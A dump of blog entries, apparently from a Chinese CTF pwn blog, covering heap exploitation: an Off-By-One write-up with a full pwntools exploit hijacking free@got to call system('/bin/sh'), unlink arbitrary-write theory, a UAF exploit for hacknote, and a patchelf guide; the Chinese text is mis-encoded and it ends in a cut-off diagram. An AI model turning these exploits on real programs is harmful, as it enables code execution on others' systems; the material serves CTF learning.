class="hljs-number">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class="hljs-number">0x90</span>,<span class="hljs-string">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class="hljs-number">0x90</span>) + p64(<span class="hljs-number">0xa0</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x100</span>,fake_chunk)<br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +p64(free_got)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x20</span> ,payload)<br><span class="hljs-comment">#gdb.attach(r)</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-number">8</span>,p64(system_plt))<br>delete(<span class="hljs-number">2</span>)<br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Off-By-One</title>
    <link href="/2022/11/27/ctf-pwn/Off-By-One/"/>
    <url>/2022/11/27/ctf-pwn/Off-By-One/</url>
    
    <content type="html"><![CDATA[<h4 id="Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ"><a href="#Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ" class="headerlink" title="Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ"></a>Off-By-Oneæ¼æ´å¦‚ä½•äº§ç”Ÿ</h4><ol><li><p>å¾ªç¯å¤šä¸€æ¬¡</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C">x = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">10</span>);<br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=<span class="hljs-number">10</span>;i++)<br>&#123;<br>    x[i] = getchar();<br>&#125;<br></code></pre></td></tr></table></figure><p>xçš„ä¸‹ä¸€ä¸ªchunkç¬¬ä¸€ä¸ªå­—èŠ‚è¢«æº¢å‡ºäº†</p></li><li><p><code>strlen</code>å’Œ<code>strcpy</code>è¡Œä¸ºä¸ä¸€è‡´</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span>(<span class="hljs-built_in">strlen</span>(buffer)==<span class="hljs-number">100</span>)<br>&#123;<br>    <span class="hljs-built_in">strcpy</span>(chunk,buffer);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>strlen</code>è¿”å›å€¼ä¸ç®—ç»“æŸç¬¦â€™<code>\0</code>ï¼Œè€Œ<code>strcpy</code>å¤åˆ¶æ—¶ä¼šæŠŠç»“æŸç¬¦åœ¨å†…çš„101ä¸ªå­—ç¬¦å¤åˆ¶è¿‡å»</p></li></ol><h4 id="hitcon-creator"><a href="#hitcon-creator" class="headerlink" title="hitcon_creator"></a>hitcon_creator</h4><p>é¢˜ç›®æ¥æº</p><p><a href="https://buuoj.cn/challenges#hitcontraining_heapcreator">https://buuoj.cn/challenges#hitcontraining_heapcreator</a></p><h5 id="1-create"><a href="#1-create" class="headerlink" title="1. create"></a>1. create</h5><p><img src="/img/off_by_one/1.png"></p><p>ä»ä¸Šè¿°ç»“æ„å¯ä»¥æ¨æ–­å‡ºheaparrayæ˜¯å¦‚ä¸‹ç»“æ„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span>&#123;</span><br>    int_64   size;<br>    <span class="hljs-type">char</span> * content;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">heaparray_item</span> * <span class="hljs-title">heaparray</span>[10];</span><br></code></pre></td></tr></table></figure><h5 id="2-edit"><a href="#2-edit" class="headerlink" title="2. edit"></a>2. edit</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-keyword">if</span> ( *(&amp;heaparray + v1) )<br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Content of heap : &quot;</span>);<br>    read_input(*((_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1</span>), *(_QWORD *)*(&amp;heaparray + v1) + <span class="hljs-number">1LL</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Done !&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><code>read_input</code>è¯»å–size+1å­—èŠ‚ï¼Œå‡ºç°äº†off_by_oneæ¼æ´</p><p>å¯ä»¥è¦†ç›–ä¸‹ä¸€ä¸ªchunkçš„sizeå­—æ®µ</p><h5 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h5><ol><li><p>ç”³è¯·ä¸‰ä¸ªå †å—ï¼Œå¤§å°ä¸º0x18,0x10,0x10ï¼ŒåŠ ä¸Šä¸‰æ¬¡sizeç”³è¯·çš„0x10ï¼Œä¸€å…±6ä¸ªchunk</p><p> <img src="/img/off_by_one/2.jpg"></p></li><li><p>ä¿®æ”¹0å·å—ï¼Œå†™å…¥<code>/bin/sh</code>ï¼Œç„¶åå†æº¢å‡º<code>0x81</code>åˆ°ä¸‹ä¸€ä¸ªchunkçš„size</p><p><img src="/img/off_by_one/3.jpg"></p></li><li><p>è¿™æ—¶delete chunk 1ï¼Œä¼šåˆå¹¶åˆ°å‰ä¸€ä¸ªchunkï¼ˆä¹Ÿå°±æ˜¯1çš„sizeæ‰€åœ¨chunkï¼‰ä¸­</p><p> <img src="/img/off_by_one/4.jpg"></p><p> è§‚å¯Ÿbinsï¼Œå‘ç°è¿™ä¸ªchunkè¢«freeåˆ°fastbinçš„0x80èŠ‚ç‚¹ä¸Šï¼ˆ0x20ä¸Šä¹Ÿæœ‰ä¸€ä¸ªchunkæ˜¯å› ä¸ºdeleteä¹Ÿä¼šå°†sizeé‡Šæ”¾æ‰ï¼‰</p><p> <img src="/img/off_by_one/5.jpg"></p></li><li><p>ç”³è¯·ä¸€ä¸ªæ–°çš„chunkï¼Œå°†0x80è¿™ä¸ªå—ç”³è¯·å‡ºæ¥ï¼Œå› æ­¤mallocçš„å¤§å°éœ€è¦ä¸º0x70</p><p> åŒæ—¶ï¼Œåœ¨2å·çš„contentä½ç½®å†™å…¥<code>free@got</code></p><p> è¿™æ—¶è°ƒç”¨show(2)ä¼šæ³„éœ²freeçš„åœ°å€</p><p> <img src="/img/off_by_one/6.jpg"></p></li><li><p>æ³„éœ²libcåŸºå€æ‰¾åˆ°systemåœ°å€</p></li><li><p><code>edit(2,p64(system_addr))</code>æ—¶ï¼Œä¼šä¿®æ”¹contentæŒ‡é’ˆæŒ‡å‘çš„å†…å®¹ï¼Œè€ŒcontentæŒ‡é’ˆè¢«<code>free@got</code>æ›¿æ¢æ‰äº†ï¼Œæ‰€ä»¥freeçš„gotè¡¨è¢«ä¿®æ”¹æˆäº†<code>system@got</code>ä¸Šçš„åœ°å€</p></li><li><p>ç„¶å<code>delete(0)</code>æ—¶ï¼Œé¦–å…ˆè¦freeæ‰<code>heaparray[0].content</code>ä¸Šçš„å†…å®¹ï¼Œä½†æ˜¯ç”±äºfreeè¢«æ›¿æ¢æˆäº†systemï¼Œç»“æœå°±å˜æˆäº†ä»¥contentæŒ‡é’ˆä¸ºå‚æ•°è°ƒç”¨systemå‡½æ•°çš„æƒ…å†µï¼Œè€Œ<code>heaparray[0].content</code>æ°å¥½æ˜¯ä¹‹å‰å†™è¿‡çš„<code>/bin/sh</code>ï¼Œå› æ­¤æ‰§è¡Œäº†`system(â€˜/bin/shâ€™)</p></li></ol><h5 id="å®Œæ•´exp"><a href="#å®Œæ•´exp" class="headerlink" title="å®Œæ•´exp"></a>å®Œæ•´exp</h5><blockquote><p>libcsearcheræŒ‘ç‰ˆæœ¬ä¸º2.23çš„</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>r = process(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><span class="hljs-comment">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class="hljs-string">&#x27;./heapcreator&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Heap : &quot;</span>,<span class="hljs-built_in">str</span>(size))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap:&quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>    r.sendlineafter(<span class="hljs-string">&quot;heap : &quot;</span>,content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    r.sendlineafter(<span class="hljs-string">&quot;choice :&quot;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class="hljs-string">&quot;Index :&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br>free_got = elf.got[<span class="hljs-string">&#x27;free&#x27;</span>]<br><br>add(<span class="hljs-number">0x18</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br>add(<span class="hljs-number">0x10</span>,<span class="hljs-string">&quot;MMMM&quot;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>+<span class="hljs-string">b&#x27;\x81&#x27;</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>delete(<span class="hljs-number">1</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>add(<span class="hljs-number">0x70</span>,p64(<span class="hljs-number">1</span>)*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x8</span>)+p64(free_got))<br>show(<span class="hljs-number">2</span>)<br><span class="hljs-comment">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-comment">#libc</span><br>libc = LibcSearcher(<span class="hljs-string">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class="hljs-string">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br><br>edit(<span class="hljs-number">2</span>,p64(system_addr))<br><span class="hljs-comment">#gdb.attach(r)</span><br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
      <tag>exp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>patchelfä¿®æ”¹libcç‰ˆæœ¬</title>
    <link href="/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/"/>
    <url>/2022/11/27/ctf-pwn/patchelf%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8Flibc%E7%89%88%E6%9C%AC/</url>
    
    <content type="html"><![CDATA[<h4 id="å®‰è£…glibc-all-in-one"><a href="#å®‰è£…glibc-all-in-one" class="headerlink" title="å®‰è£…glibc-all-in-one"></a>å®‰è£…glibc-all-in-one</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">git clone https://github.com/matrix1001/glibc-all-in-one<br>cd glibc-all-in-one<br>./update_list<br>cat list <br>./download &lt;libc-in-list&gt;<br></code></pre></td></tr></table></figure><h4 id="ä¿®æ”¹libc-soå’Œld-so"><a href="#ä¿®æ”¹libc-soå’Œld-so" class="headerlink" title="ä¿®æ”¹libc.soå’Œld.so"></a>ä¿®æ”¹libc.soå’Œld.so</h4><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sh">patchelf --set-interpreter ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/ld-2.23.so  &lt;path-to-elf&gt;<br><br>patchelf --replace-needed libc.so.6 ./glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6  &lt;path-to-elf&gt;<br><span class="hljs-comment"># param1 : old libc.so</span><br><span class="hljs-comment"># param2 : new libc.so</span><br><span class="hljs-comment"># param3 : path to elf</span><br></code></pre></td></tr></table></figure><h4 id="æ•ˆæœå›¾"><a href="#æ•ˆæœå›¾" class="headerlink" title="æ•ˆæœå›¾"></a>æ•ˆæœå›¾</h4><p><img src="/img/patchelf/1.png"></p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>unlink</title>
    <link href="/2022/11/25/ctf-pwn/unlink/"/>
    <url>/2022/11/25/ctf-pwn/unlink/</url>
    
    <content type="html"><![CDATA[<blockquote><p>ä»¥ä¸‹å†…å®¹ä¸€å¾‹å‡è®¾ sz = 4 bytes  ï¼Œ32ä½ç³»ç»Ÿ</p></blockquote><h4 id="unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†"><a href="#unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†" class="headerlink" title="unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†"></a>unlinkæ—¶å‘ä»»æ„åœ°å€å†™å…¥æ•°æ®åŸç†</h4><p>å‡è®¾éœ€è¦ä»binä¸­æ‘˜é™¤ä¸€ä¸ª<strong>é¦–åœ°å€ä¸ºP</strong>çš„chunk</p><p>32ä½ç³»ç»Ÿä¸‹ï¼Œfdç›¸å¯¹äºå—é¦–çš„åç§»ä¸º8ï¼ˆprevsizeå’Œsizeéƒ½æ˜¯4å­—èŠ‚ï¼‰ï¼Œbkåç§»ä¸º12</p><p>å³ <code>fd = P+8 </code> ï¼Œ<code>bk = P+12</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-comment">// unlinkæ—¶éœ€è¦ å°†P.fdæŒ‡å‘çš„å—çš„bk èµ‹å€¼ä¸º P.bkä¸Šçš„å€¼</span><br>*(*(P+<span class="hljs-number">8</span>)+<span class="hljs-number">12</span>) = *(P+<span class="hljs-number">12</span>)<br><span class="hljs-comment">// å°†P.bkæŒ‡å‘çš„å—çš„fd èµ‹å€¼ä¸º P.fdä¸Šçš„å€¼</span><br>*(*(P+<span class="hljs-number">12</span>)+<span class="hljs-number">8</span>) = *(P+<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>å‡è®¾æƒ³è¦å‘0x4000000Cè¿™ä¸ªåœ°å€ä¸Šå†™å…¥0xdeadbeefè¿™ä¸ªå€¼</p><p>åªéœ€å°†<code>*(P+8)</code>èµ‹å€¼ä¸º0x40000000ï¼Œå°†<code>*(P+12)</code>èµ‹å€¼ä¸º0xdeadbeefï¼Œåœ¨unlinkæ—¶å°±ä¼šå®Œæˆèµ‹å€¼</p><p>è¿™ç§æ–¹æ³•æ˜¯å°†fdè®¾ç½®ä¸ºäº†target addr - 12 ï¼Œbkè®¾ç½®ä¸ºäº†expect value</p><blockquote><p>ä¹Ÿå¯ä»¥å°†fdè®¾ç½®ä¸ºexpect valueï¼Œbkè®¾ç½®ä¸ºtarget addr - 8ï¼Œä½†æ˜¯åæ–‡é»˜è®¤å‡ä½¿ç”¨å‰ä¸€ç§æ”»å‡»æ–¹æ³•</p></blockquote><p>unlinkæ¼æ´åŒæ—¶å‘ä¸¤ä¸ªåœ°å€è¿›è¡Œäº†å†™å…¥ï¼Œæ‰€ä»¥åœ¨ä¿è¯targe taddr -12 å¯ä»¥å†™å…¥çš„åŒæ—¶ï¼Œä¹Ÿè¦ä¿è¯expect value + 8 æœ‰å†™å…¥æƒé™</p><h4 id="åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å"><a href="#åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å" class="headerlink" title="åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å"></a>åŠ å…¥æ£€æŸ¥æœºåˆ¶ä¹‹å</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C">FD = P-&gt;fd;<br>BK = P-&gt;bk;<br><span class="hljs-keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="hljs-number">0</span>))                      <br>  malloc_printerr (check_action, <span class="hljs-string">&quot;corrupted double-linked list&quot;</span>, P, AV); <br>FD-&gt;bk = BK;<br>BK-&gt;fd = FD;<br></code></pre></td></tr></table></figure><p>å› æ­¤æº¢å‡ºæ—¶éœ€è¦é¢å¤–ä¿è¯ä»¥ä¸‹æ¡ä»¶</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs lisp">*(<span class="hljs-name">*</span>(<span class="hljs-name">P+8</span>) <span class="hljs-number">+12</span>) == P<br>*(<span class="hljs-name">*</span>(<span class="hljs-name">P+12</span>)+ <span class="hljs-number">8</span>) == P<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥éœ€è¦æ‰¾åˆ°å †ç®¡ç†åˆ—è¡¨é‡Œé¢æŒ‡å‘chunk Pçš„æŒ‡é’ˆ<strong>ptr</strong>ï¼Œè®©Pçš„fdæŒ‡å‘ptr-12ï¼ŒPçš„bkæŒ‡å‘ptr-8ï¼Œè¿™æ ·P-&gt;fd-&gt;bkæŒ‡å‘Pï¼ŒP-&gt;bk-&gt;fdä¹ŸæŒ‡å‘Pã€‚</p><p>ç»•è¿‡ifåˆ¤æ–­ä¹‹åï¼Œä¸‹é¢ä¸¤æ¡èµ‹å€¼è¯­å¥é¦–å…ˆå°† FD-&gt;bkï¼ˆä¹Ÿå°±æ˜¯ptrï¼‰æŒ‡å‘äº†BKï¼Œå†å°†BK-&gt;fdï¼ˆè¿˜æ˜¯ptrï¼Œåˆæ”¹å˜äº†ä¸€æ¬¡ptrï¼‰æŒ‡å‘äº†FDã€‚</p><p>å› æ­¤åé¢è¿™ä¸¤æ¡èµ‹å€¼è¯­å¥ç¡®å®å®Œæˆäº†FDå’ŒBK unlink çš„æ•ˆæœï¼Œå”¯ä¸€è¢«æ”¹å˜çš„æ˜¯ptrï¼Œå®ƒä»åŸæœ¬æŒ‡å‘chunk pï¼Œå˜æˆäº†*(ptr - 12)</p>]]></content>
    
    
    <categories>
      
      <category>ctf-pwn</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UAF</title>
    <link href="/2022/11/22/ctf-pwn/%E5%A0%86%E5%88%A9%E7%94%A8%20UAF/"/>
    <url>/2022/11/22/ctf-pwn/%E5%A0%86%E5%88%A9%E7%94%A8%20UAF/</url>
    
    <content type="html"><![CDATA[<h4 id="å‚è€ƒctf-wiki"><a href="#å‚è€ƒctf-wiki" class="headerlink" title="å‚è€ƒctf-wiki"></a>å‚è€ƒctf-wiki</h4><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/use_after_free/hitcon-training-hacknote</a></p><p>ä»¥ä¸‹å®éªŒæ‰€ç”¨ç¨‹åºï¼ˆä¸æºç ï¼‰è§ä¸Šè¿°é“¾æ¥ä¸­æ–‡ä»¶hacknoteï¼ˆä¸hacknote.cï¼‰</p><h4 id="æ¼æ´çš„å‘ç°"><a href="#æ¼æ´çš„å‘ç°" class="headerlink" title="æ¼æ´çš„å‘ç°"></a>æ¼æ´çš„å‘ç°</h4><p>åœ¨<code>del_note()</code>å‡½æ•°ä¸­freeæ‰æŒ‡é’ˆä¹‹åæ²¡æœ‰æ¸…é›¶ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">void</span> <span class="hljs-title function_">del_note</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-type">int</span> idx;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Index :&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>  idx = atoi(buf);<br>  <span class="hljs-keyword">if</span> (idx &lt; <span class="hljs-number">0</span> || idx &gt;= count) &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Out of bound!&quot;</span>);<br>    _exit(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">if</span> (notelist[idx]) &#123;<br>    <span class="hljs-built_in">free</span>(notelist[idx]-&gt;content);<br>    <span class="hljs-built_in">free</span>(notelist[idx]);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Success&quot;</span>);<br>  &#125;<br>&#125;<br><span class="hljs-comment">// å¹¶ä¸”åœ¨add_noteä¸­æ˜¯æ ¹æ®notelist[i]æ˜¯å¦ä¸ºnullptråˆ¤æ–­åœ¨å“ªä¸ªä½ç½®addæ–°note</span><br></code></pre></td></tr></table></figure><p>ç¨‹åºä¸­ç»™äº†systemï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-type">int</span> <span class="hljs-title function_">magic</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-keyword">return</span> system(<span class="hljs-string">&quot;cat flag&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="æ¼æ´åˆ©ç”¨æ–¹æ³•"><a href="#æ¼æ´åˆ©ç”¨æ–¹æ³•" class="headerlink" title="æ¼æ´åˆ©ç”¨æ–¹æ³•"></a>æ¼æ´åˆ©ç”¨æ–¹æ³•</h4><p>expå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;aaaa\n&#x27;</span>)<br>add(<span class="hljs-number">0x20</span>, <span class="hljs-string">&#x27;bbbb\n&#x27;</span>)<br>delete(<span class="hljs-number">0</span>)<br>delete(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">0x8</span>, p32(magic))<br>show(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>ä¸‹é¢ä»‹ç»è¿™ä¸ªexpçš„åŸç†</p><p>åœ¨delete 0å’Œ1ä¹‹åfastbinç»“æ„å¦‚ä¸‹å›¾</p><div class="mxgraph" style="max-width:100%;border:1px solid transparent;" data-mxgraph="{&quot;highlight&quot;:&quot;#0000ff&quot;,&quot;nav&quot;:true,&quot;resize&quot;:true,&quot;xml&quot;:&quot;&lt;mxfile host=\&quot;app.diagrams.net\&quot; modified=\&quot;2022-11-22T16:47:04.851Z\&quot; agent=\&quot;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36\&quot; etag=\&quot;xMjKslWb0NtHo6yfLEq6\&quot; version=\&quot;20.5.3\&quot; type=\&quot;device\&quot;&gt;&lt;diagram id=\&quot;wU8d93oxY3eO_jrvUp61\&quot; name=\&quot;ç¬¬ 1 é¡µ\&quot;&gt;7VlZj9sgEP4tfbDUPqRyfOR43CTbXamt1GrVdts3YmMbBYOLydVfXzDgM8c2qyZZaV9imBkG+Ga+ATuWO003dwxkyWcaQmw5drix3JnlOP3h2BYPKdkqycjVgpihUBtVggf0B2qhMVuiEOYNQ04p5ihrCgNKCAx4QwYYo+umWURxc9YMxLAjeAgA7kp/oJAnehfOsJLfQxQnZub+YKw0KTDGeid5AkK6roncW8udMkq5aqWbKcQSPIOLGvdhj7ZcGIOEP2XA6uun4bfsz+BxDqPo4+Ps1/dl2hsoLyuAl3rD1tSxJkP96wxAmlnuhMxz+bDkFNcoqq/56b+XX/du0Wm7ORGDIjX51uQ7o0sSQpkytljNOkEcPmQgkNq1YLiQJTzFotcXzYgSrinrjIrFt1NSZ+kKMg43NZFO0TtIU8jZVpgYraGLrheur/vrin2+qSFJjXkDLQOa8HHpuuKEaGha/ANFhl2KOAMsZp3kGSAN9Aa/l5LNk4Biyiz3RihZPH8rViamts3jnQqzBK8XgRThrTK9h3gFOQpATZ8X6EqtM8o2dYWaVGoIZSnANd0KMATEE6MY8CWT5fOgXQCyfSZrjbBUeratNBhyDllPbD9AJO6OpCxLANEuHSUT4ec9IFZElDgQKQJZTYdE2hE9k222Wmg4E84i4d/MRKDSipQo6nttmjVlYXNhpS+xl/kCCXfSZ84ZXcCeTqqG3RwEi7igQa8VR8cbqRA63lg3fBPNwmsIA8oAR5T0eIKCBYG5Xh4iiCODT9u2FsuDdrXlNOwiTAFvgxOiPMNga8wxEgrHfoPSjDIOJNKTKmFFK5bPCORcQoBE9HSSC86oPFcWnYIhF3neSnGgMvS9c1aG0Y7KcG3l1D9eTsuSexbQxtcPmju4NtDMbfgQapCEN/LCK3oBBnmOgiZQTVTbsMEN4o9S997XvZ96nGzPNnpY0dnqzl6oc7pkATzOHBg2Lt/dgNQP/R14GxmDWFTIVfPKvisIeoYvFBFexdv3mvH2/FYc1X70qPoVu+WofGsxjoYtRxywGPKOoyInym0/I02cTpoEyZIshGhq6vmcmVJub0bdcn5p7rULVgnh5bjnvSjuXQmn2lQo7+zP5ZQ/PjOn/L2cun